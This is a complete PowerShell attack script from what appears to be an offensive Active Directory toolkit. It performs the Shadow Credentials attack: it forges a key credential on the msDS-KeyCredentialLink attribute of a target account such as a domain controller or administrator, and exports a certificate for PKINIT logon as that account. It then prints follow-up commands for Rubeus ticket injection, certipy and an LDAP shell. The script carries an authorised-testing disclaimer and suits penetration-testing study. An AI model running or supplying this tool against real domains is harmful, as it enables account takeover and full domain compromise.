<#
.SYNOPSIS
    Shadow Credentials Attack - Native LOLBAS (Standalone).
.DESCRIPTION
    Adds, lists, or removes shadow credentials (msDS-KeyCredentialLink) on AD
    objects using only native Windows components. Generates RSA key pairs,
    builds KeyCredential blobs per MS-ADTS 2.2.20, and exports PFX files
    for PKINIT authentication.

    Authenticates using the current user's domain context (no external tools).
.PARAMETER Target
    sAMAccountName of the target object (e.g., "POLARIS$", "administrator")
.PARAMETER Action
    Operation to perform:
      Add    - Add a shadow credential to the target
      List   - List existing shadow credentials on the target
      Remove - Remove a shadow credential by DeviceId
      Clear  - Remove ALL shadow credentials from the target
.PARAMETER DeviceId
    DeviceId GUID of the shadow credential to remove (for Remove action)
.PARAMETER DCTarget
    Domain Controller FQDN (auto-detected if omitted)
.PARAMETER OutputDir
    Directory for PFX output (default: $env:TEMP\shadow-ops)
.EXAMPLE
    .\Invoke-ShadowCredentials.ps1 -Target "POLARIS$" -Action Add
.EXAMPLE
    .\Invoke-ShadowCredentials.ps1 -Target "POLARIS$" -Action List
.EXAMPLE
    .\Invoke-ShadowCredentials.ps1 -Target "POLARIS$" -Action Remove -DeviceId "a1b2c3d4-..."
.EXAMPLE
    .\Invoke-ShadowCredentials.ps1 -Target "administrator" -Action Add -DCTarget polaris.zsec.red
.NOTES
    For authorised security testing and educational purposes only.
    Requires: Windows 10/Server 2016+ (New-SelfSignedCertificate), write access
    to msDS-KeyCredentialLink on the target object, and PKINIT-capable domain.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$Target,

    [ValidateSet('Add','List','Remove','Clear')]
    [string]$Action = 'Add',

    [string]$DeviceId,
    [string]$DCTarget,
    [string]$OutputDir = "$env:TEMP\shadow-ops"
)

$ErrorActionPreference = 'Stop'

# ============================================================================
#  Auto-detect DC and resolve target DN
# ============================================================================

function Get-DomainInfo {
    $root = [ADSI]"LDAP://RootDSE"
    $defaultNC = $root.defaultNamingContext[0]
    $dnsRoot = $root.dnsHostName[0]
    $domain = ($defaultNC -replace 'DC=','' -replace ',','.')
    return @{
        DefaultNC = $defaultNC
        DNSRoot   = $dnsRoot
        Domain    = $domain
    }
}

$domInfo = Get-DomainInfo

if (-not $DCTarget) {
    # Auto-detect via DNS SRV
    $srvResult = Resolve-DnsName -Name "_ldap._tcp.$($domInfo.Domain)" -Type SRV -ErrorAction SilentlyContinue |
        Select-Object -First 1
    if ($srvResult) {
        $DCTarget = $srvResult.NameTarget
    } else {
        $DCTarget = $domInfo.DNSRoot
    }
}

Write-Host ""
Write-Host "  Shadow Credentials - Native LOLBAS" -ForegroundColor White
Write-Host "  ------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  [i] Domain : $($domInfo.Domain)" -ForegroundColor Gray
Write-Host "  [i] DC     : $DCTarget" -ForegroundColor Gray
Write-Host "  [i] Target : $Target" -ForegroundColor Gray
Write-Host "  [i] Action : $Action" -ForegroundColor Gray
Write-Host ""

# ============================================================================
#  LDAP Connection (current user context)
# ============================================================================

Write-Host "  [>] Connecting to LDAP on $DCTarget ..." -ForegroundColor Gray

$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection($DCTarget)
$ldap.SessionOptions.ProtocolVersion = 3
$ldap.SessionOptions.Sealing = $true
$ldap.SessionOptions.Signing = $true
$ldap.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
$ldap.Bind()

Write-Host "  [+] LDAP connected (Negotiate/Kerberos)" -ForegroundColor Green
Write-Host ""

# ============================================================================
#  Resolve target sAMAccountName -> DN
# ============================================================================

function Resolve-TargetDN {
    param([string]$SAM, [string]$BaseDN)

    $filter = "(sAMAccountName=$SAM)"
    $req = New-Object System.DirectoryServices.Protocols.SearchRequest(
        $BaseDN, $filter,
        [System.DirectoryServices.Protocols.SearchScope]::Subtree,
        @("distinguishedName")
    )
    $resp = $ldap.SendRequest($req)
    if ($resp.Entries.Count -eq 0) { return $null }
    return $resp.Entries[0].DistinguishedName
}

$targetDN = Resolve-TargetDN -SAM $Target -BaseDN $domInfo.DefaultNC
if (-not $targetDN) {
    Write-Host "  [-] Target '$Target' not found in AD" -ForegroundColor Red
    exit 1
}
Write-Host "  [i] Target DN: $targetDN" -ForegroundColor Gray
Write-Host ""

# ============================================================================
#  Read existing msDS-KeyCredentialLink values
# ============================================================================

function Get-KeyCredentialLinks {
    param([string]$DN)

    $req = New-Object System.DirectoryServices.Protocols.SearchRequest(
        $DN, "(objectClass=*)",
        [System.DirectoryServices.Protocols.SearchScope]::Base,
        @("msDS-KeyCredentialLink")
    )
    $resp = $ldap.SendRequest($req)
    if ($resp.Entries.Count -eq 0) { return @() }
    $attr = $resp.Entries[0].Attributes['msDS-KeyCredentialLink']
    if (-not $attr) { return @() }
    $values = @()
    for ($i = 0; $i -lt $attr.Count; $i++) {
        $values += $attr[$i]
    }
    return $values
}

function Parse-KeyCredentialBlob {
    <# Parses a KeyCredential blob to extract DeviceId, KeyID, timestamps #>
    param([byte[]]$Blob)

    $result = @{ Version = 0; KeyId = ''; DeviceId = ''; CreationTime = '' }
    if ($Blob.Length -lt 4) { return $result }

    $result.Version = [BitConverter]::ToUInt32($Blob, 0)
    $offset = 4

    while (($offset + 6) -le $Blob.Length) {
        $entryId = [BitConverter]::ToUInt16($Blob, $offset)
        $entryLen = [BitConverter]::ToUInt32($Blob, $offset + 2)
        $dataOff = $offset + 6

        if (($dataOff + $entryLen) -gt $Blob.Length) { break }

        switch ($entryId) {
            0x0001 {
                # KeyID
                $keyIdBytes = New-Object byte[] $entryLen
                [Array]::Copy($Blob, $dataOff, $keyIdBytes, 0, $entryLen)
                $result.KeyId = ($keyIdBytes | ForEach-Object { $_.ToString("x2") }) -join ''
            }
            0x0006 {
                # DeviceId (GUID)
                if ($entryLen -eq 16) {
                    $guidBytes = New-Object byte[] 16
                    [Array]::Copy($Blob, $dataOff, $guidBytes, 0, 16)
                    $result.DeviceId = ([guid]::new($guidBytes)).ToString()
                }
            }
            0x0009 {
                # CreationTime (FILETIME)
                if ($entryLen -eq 8) {
                    $ft = [BitConverter]::ToInt64($Blob, $dataOff)
                    try { $result.CreationTime = [DateTime]::FromFileTimeUtc($ft).ToString("yyyy-MM-dd HH:mm:ss UTC") } catch {}
                }
            }
        }
        $offset = $dataOff + $entryLen
    }
    return $result
}

# ============================================================================
#  ACTION: List
# ============================================================================

if ($Action -eq 'List') {
    Write-Host "  --- Shadow Credentials on $Target ---" -ForegroundColor Cyan
    $links = Get-KeyCredentialLinks -DN $targetDN
    if ($links.Count -eq 0) {
        Write-Host "  [i] No msDS-KeyCredentialLink values found" -ForegroundColor Gray
    } else {
        $idx = 0
        foreach ($link in $links) {
            $idx++
            # DN-Binary format: B:<hexlen>:<hex>:<DN>
            $dnBinStr = if ($link -is [byte[]]) {
                [System.Text.Encoding]::UTF8.GetString($link)
            } else { [string]$link }

            if ($dnBinStr -match '^B:(\d+):([0-9A-Fa-f]+):') {
                $hexData = $Matches[2]
                $blobBytes = New-Object byte[] ($hexData.Length / 2)
                for ($i = 0; $i -lt $blobBytes.Length; $i++) {
                    $blobBytes[$i] = [Convert]::ToByte($hexData.Substring($i * 2, 2), 16)
                }
                $parsed = Parse-KeyCredentialBlob -Blob $blobBytes
                Write-Host "  [$idx] DeviceId : $($parsed.DeviceId)" -ForegroundColor Yellow
                Write-Host "       KeyId    : $($parsed.KeyId.Substring(0, [Math]::Min(16, $parsed.KeyId.Length)))..." -ForegroundColor Gray
                Write-Host "       Created  : $($parsed.CreationTime)" -ForegroundColor Gray
                Write-Host ""
            } else {
                Write-Host "  [$idx] Raw value (could not parse DN-Binary)" -ForegroundColor DarkGray
            }
        }
    }
    Write-Host "  Total: $($links.Count) credential(s)" -ForegroundColor Cyan
    Write-Host ""
    exit 0
}

# ============================================================================
#  ACTION: Remove (by DeviceId)
# ============================================================================

if ($Action -eq 'Remove') {
    if (-not $DeviceId) {
        Write-Host "  [-] -DeviceId required for Remove action" -ForegroundColor Red
        Write-Host "  [i] Use -Action List to see DeviceIds" -ForegroundColor Yellow
        exit 1
    }

    $links = Get-KeyCredentialLinks -DN $targetDN
    $found = $false

    foreach ($link in $links) {
        $dnBinStr = if ($link -is [byte[]]) {
            [System.Text.Encoding]::UTF8.GetString($link)
        } else { [string]$link }

        if ($dnBinStr -match '^B:(\d+):([0-9A-Fa-f]+):') {
            $hexData = $Matches[2]
            $blobBytes = New-Object byte[] ($hexData.Length / 2)
            for ($i = 0; $i -lt $blobBytes.Length; $i++) {
                $blobBytes[$i] = [Convert]::ToByte($hexData.Substring($i * 2, 2), 16)
            }
            $parsed = Parse-KeyCredentialBlob -Blob $blobBytes
            if ($parsed.DeviceId -eq $DeviceId) {
                Write-Host "  [>] Removing shadow credential with DeviceId $DeviceId ..." -ForegroundColor Gray
                $modAttr = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $modAttr.Name = "msDS-KeyCredentialLink"
                $modAttr.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                $modAttr.Add($dnBinStr) | Out-Null
                $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest($targetDN, $modAttr)
                $ldap.SendRequest($mod) | Out-Null
                Write-Host "  [+] Shadow credential removed" -ForegroundColor Green
                $found = $true
                break
            }
        }
    }

    if (-not $found) {
        Write-Host "  [-] No credential found with DeviceId: $DeviceId" -ForegroundColor Red
        Write-Host "  [i] Use -Action List to see DeviceIds" -ForegroundColor Yellow
    }
    Write-Host ""
    exit 0
}

# ============================================================================
#  ACTION: Clear (remove ALL)
# ============================================================================

if ($Action -eq 'Clear') {
    Write-Host "  [>] Clearing ALL msDS-KeyCredentialLink values on $Target ..." -ForegroundColor Yellow
    $modAttr = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
    $modAttr.Name = "msDS-KeyCredentialLink"
    $modAttr.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest($targetDN, $modAttr)
    try {
        $ldap.SendRequest($mod) | Out-Null
        Write-Host "  [+] All shadow credentials cleared" -ForegroundColor Green
    } catch {
        if ($_.Exception.Message -match 'NoSuchAttribute') {
            Write-Host "  [i] No credentials to clear (attribute empty)" -ForegroundColor Gray
        } else { throw }
    }
    Write-Host ""
    exit 0
}

# ============================================================================
#  ACTION: Add - Generate key pair and write shadow credential
# ============================================================================

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

# Stage 1: Generate RSA 2048 key pair + self-signed certificate
Write-Host "  [1/4] Generating RSA 2048 key pair + self-signed certificate ..." -ForegroundColor White
Write-Host ""
Write-Host "    PS> New-SelfSignedCertificate -Subject 'CN=ShadowCred'  ``" -ForegroundColor DarkYellow
Write-Host "            -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256  ``" -ForegroundColor DarkYellow
Write-Host "            -KeyExportPolicy Exportable -CertStoreLocation Cert:\CurrentUser\My  ``" -ForegroundColor DarkYellow
Write-Host "            -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.2')" -ForegroundColor DarkYellow
Write-Host ""

try {
    $certParams = @{
        Subject            = "CN=ShadowCred"
        CertStoreLocation  = "Cert:\CurrentUser\My"
        KeyExportPolicy    = "Exportable"
        KeyLength          = 2048
        KeyAlgorithm       = "RSA"
        HashAlgorithm      = "SHA256"
        NotAfter           = (Get-Date).AddYears(2)
        KeySpec            = "KeyExchange"
        TextExtension      = @("2.5.29.37={text}1.3.6.1.5.5.7.3.2")
    }
    $cert = New-SelfSignedCertificate @certParams
    Write-Host "    [+] Certificate created: $($cert.Thumbprint)" -ForegroundColor Green
} catch {
    Write-Host "    [-] New-SelfSignedCertificate failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "    [i] Requires Windows 10 / Server 2016+ with PKI module" -ForegroundColor Yellow
    exit 1
}

# Export PFX
$pfxPass = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$ts = Get-Date -Format 'yyyyMMdd-HHmmss'
$pfxPath = "$OutputDir\shadowcred-$Target-$ts.pfx"
$pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $pfxPass)
[System.IO.File]::WriteAllBytes($pfxPath, $pfxBytes)
Write-Host "    [+] PFX exported: $pfxPath" -ForegroundColor Green
Write-Host ""

# Stage 2: Build BCRYPT_RSAKEY_BLOB (public key)
Write-Host "  [2/4] Building BCRYPT_RSAKEY_BLOB + KeyCredential blob (MS-ADTS 2.2.20) ..." -ForegroundColor White
Write-Host ""
Write-Host "    Structure: Version(0x200) + Entries(KeyID, KeyHash, KeyMaterial," -ForegroundColor DarkGray
Write-Host "               KeyUsage=NGC, KeySource=AD, DeviceId, CustomKeyInfo, timestamps)" -ForegroundColor DarkGray
Write-Host ""

$rsaKey = $cert.PublicKey.Key
$rsaParams = $rsaKey.ExportParameters($false)

# Build BCRYPT_RSAKEY_BLOB
$ms = New-Object System.IO.MemoryStream
$bw = New-Object System.IO.BinaryWriter($ms)
$bw.Write([uint32]0x31415352)                         # Magic: RSA1
$bw.Write([uint32]($rsaParams.Modulus.Length * 8))     # BitLength
$bw.Write([uint32]$rsaParams.Exponent.Length)          # cbPublicExp
$bw.Write([uint32]$rsaParams.Modulus.Length)            # cbModulus
$bw.Write([uint32]0)                                   # cbPrime1
$bw.Write([uint32]0)                                   # cbPrime2
$bw.Write($rsaParams.Exponent)
$bw.Write($rsaParams.Modulus)
$bw.Flush()
$keyMaterial = $ms.ToArray()
$bw.Dispose(); $ms.Dispose()

# KeyID = SHA256(KeyMaterial)
$sha = [System.Security.Cryptography.SHA256]::Create()
$keyId = $sha.ComputeHash($keyMaterial)

# Timestamps and DeviceId
$nowFT = [BitConverter]::GetBytes([long][DateTime]::UtcNow.ToFileTimeUtc())
$devId = [guid]::NewGuid().ToByteArray()

# Build all entries (except KeyHash) for hash computation
$eMs = New-Object System.IO.MemoryStream
$eBw = New-Object System.IO.BinaryWriter($eMs)
$eBw.Write([uint16]0x0001); $eBw.Write([uint32]$keyId.Length); $eBw.Write($keyId)         # KeyID
$eBw.Write([uint16]0x0003); $eBw.Write([uint32]$keyMaterial.Length); $eBw.Write($keyMaterial) # KeyMaterial
$eBw.Write([uint16]0x0004); $eBw.Write([uint32]1); $eBw.Write([byte]0x01)                 # KeyUsage = NGC
$eBw.Write([uint16]0x0005); $eBw.Write([uint32]1); $eBw.Write([byte]0x00)                 # KeySource = AD
$eBw.Write([uint16]0x0006); $eBw.Write([uint32]$devId.Length); $eBw.Write($devId)          # DeviceId
$eBw.Write([uint16]0x0007); $eBw.Write([uint32]2); $eBw.Write([byte]0x01); $eBw.Write([byte]0x00) # CustomKeyInfo
$eBw.Write([uint16]0x0008); $eBw.Write([uint32]$nowFT.Length); $eBw.Write($nowFT)          # LastLogon
$eBw.Write([uint16]0x0009); $eBw.Write([uint32]$nowFT.Length); $eBw.Write($nowFT)          # CreationTime
$eBw.Flush()
$entriesData = $eMs.ToArray()
$eBw.Dispose(); $eMs.Dispose()

# KeyHash = SHA256(Version + all entries except KeyHash)
$hMs = New-Object System.IO.MemoryStream
$hMs.Write([BitConverter]::GetBytes([uint32]0x200), 0, 4)
$hMs.Write($entriesData, 0, $entriesData.Length)
$keyHash = $sha.ComputeHash($hMs.ToArray())
$hMs.Dispose()
$sha.Dispose()

Write-Host "    [+] KeyCredential blob assembled ($($entriesData.Length + 4 + 6 + $keyHash.Length) bytes)" -ForegroundColor Green
Write-Host ""

# Stage 3: Assemble final blob and write to AD
Write-Host "  [3/4] Writing msDS-KeyCredentialLink via LDAP ..." -ForegroundColor White
Write-Host ""
Write-Host "    PS> `$mod = [ModifyRequest]::new(`$targetDN, [Add], 'msDS-KeyCredentialLink', `$dnBinary)" -ForegroundColor DarkYellow
Write-Host "    PS> `$ldap.SendRequest(`$mod)" -ForegroundColor DarkYellow
Write-Host ""

# Assemble final blob: Version + all entries with KeyHash
$fMs = New-Object System.IO.MemoryStream
$fBw = New-Object System.IO.BinaryWriter($fMs)
$fBw.Write([uint32]0x200)  # Version
$fBw.Write([uint16]0x0001); $fBw.Write([uint32]$keyId.Length); $fBw.Write($keyId)
$fBw.Write([uint16]0x0002); $fBw.Write([uint32]$keyHash.Length); $fBw.Write($keyHash)
$fBw.Write([uint16]0x0003); $fBw.Write([uint32]$keyMaterial.Length); $fBw.Write($keyMaterial)
$fBw.Write([uint16]0x0004); $fBw.Write([uint32]1); $fBw.Write([byte]0x01)
$fBw.Write([uint16]0x0005); $fBw.Write([uint32]1); $fBw.Write([byte]0x00)
$fBw.Write([uint16]0x0006); $fBw.Write([uint32]$devId.Length); $fBw.Write($devId)
$fBw.Write([uint16]0x0007); $fBw.Write([uint32]2); $fBw.Write([byte]0x01); $fBw.Write([byte]0x00)
$fBw.Write([uint16]0x0008); $fBw.Write([uint32]$nowFT.Length); $fBw.Write($nowFT)
$fBw.Write([uint16]0x0009); $fBw.Write([uint32]$nowFT.Length); $fBw.Write($nowFT)
$fBw.Flush()
$blob = $fMs.ToArray()
$fBw.Dispose(); $fMs.Dispose()

# Format as DN-Binary value for msDS-KeyCredentialLink
$hex = ($blob | ForEach-Object { $_.ToString("X2") }) -join ''
$dnBinary = "B:$($hex.Length):${hex}:$targetDN"

# Write via LDAP (Add, not Replace - preserves existing creds)
$mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
    $targetDN,
    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
    "msDS-KeyCredentialLink",
    $dnBinary
)
$ldap.SendRequest($mod) | Out-Null

# Remove temp cert from local store
$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
$store.Open("ReadWrite")
$store.Remove($cert)
$store.Close()

$devGuid = [guid]::new($devId)
Write-Host "    [+] Shadow credential added successfully" -ForegroundColor Green
Write-Host ""

# Stage 4: Summary
Write-Host "  [4/4] Summary" -ForegroundColor White
Write-Host ""
Write-Host "    Target    : $Target ($targetDN)" -ForegroundColor Cyan
Write-Host "    DeviceId  : $devGuid" -ForegroundColor Cyan
Write-Host "    PFX File  : $pfxPath" -ForegroundColor Cyan
Write-Host "    PFX Pass  : $pfxPass" -ForegroundColor Cyan
Write-Host ""
Write-Host "  --- Next Steps: Authenticate with PKINIT ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "    # Rubeus (Windows)" -ForegroundColor DarkGray
Write-Host "    Rubeus.exe asktgt /user:$Target /certificate:`"$pfxPath`" /password:`"$pfxPass`" /ptt" -ForegroundColor White
Write-Host ""
Write-Host "    # certipy (Linux)" -ForegroundColor DarkGray
Write-Host "    certipy auth -pfx shadowcred-$Target-$ts.pfx -dc-ip $DCTarget" -ForegroundColor White
Write-Host ""
Write-Host "    # PassTheCert LDAP Shell (this toolkit)" -ForegroundColor DarkGray
Write-Host "    .\Invoke-PassTheCert.ps1 -PFXFile `"$pfxPath`" -PFXPassword `"$pfxPass`" -Action LdapShell -DCTarget $DCTarget" -ForegroundColor White
Write-Host ""
Write-Host "    # Cleanup (remove this credential)" -ForegroundColor DarkGray
Write-Host "    .\Invoke-ShadowCredentials.ps1 -Target `"$Target`" -Action Remove -DeviceId `"$devGuid`"" -ForegroundColor White
Write-Host ""
